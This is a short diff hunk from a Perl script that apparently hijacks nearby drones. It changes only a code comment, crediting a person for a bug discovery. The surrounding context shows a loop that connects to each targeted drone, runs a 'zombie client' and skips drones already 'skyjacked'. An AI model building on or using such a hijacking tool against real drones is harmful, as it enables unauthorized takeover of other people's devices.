@@ -129,7 +129,7 @@ while (1)
 		# connect to each drone and run our zombie client!
 		foreach my $drone (keys %chans)
 		{
-			# ignore drones we've skyjacked before
+			# ignore drones we've skyjacked before -- thanks to @daviottenheimer for bug discovery!
 			next if $skyjacked{$chans{$drone}[1]}++;
 
 			print "\n\nConnecting to drone $chans{$drone}[1] ($drone)\n";
